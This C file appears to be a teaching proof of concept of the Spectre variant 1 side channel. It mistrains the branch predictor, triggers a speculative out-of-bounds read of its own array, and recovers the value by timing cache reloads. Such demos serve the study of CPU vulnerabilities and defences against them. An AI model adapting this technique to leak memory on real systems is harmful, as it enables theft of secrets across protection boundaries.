#include <stdio.h>
#include <stdlib.h>

#include "gen_array.c"
#include "time_and_flush.c"


//last two pages will not be accessible.
int accessible_pages = N_PAGES-2;
int secret_data[N_PAGES];

__attribute__((noinline)) void victim_func(int i, cp_t* arr) {

    //flush bound value
    flush((void*)&accessible_pages);
    __sync_synchronize();

    //access (possibly out of bounds)
    if (i < accessible_pages) {
        int x = secret_data[i];
        volatile cp_t cp = arr[x];
    }
}

int main(int argc, char* argv[]) {

    cp_t* arr = mmap_arr_cache_pages();

    //array [0,1,2,3,4...]. one-but-last points to last.
    for(int i = 0; i < N_PAGES; i++) { secret_data[i] = i; }
    secret_data[N_PAGES-1-1] = N_PAGES-1;

    //Misstrain branch predictor
    for(int i = 0; i < accessible_pages; i++) victim_func(i, arr);

    //flush remnant data
    flush_arr((void*)arr);
    __sync_synchronize();

    //access out of bounds
    victim_func(accessible_pages, arr);

    //time loading duration per array index
    reload(arr, N_PAGES);
}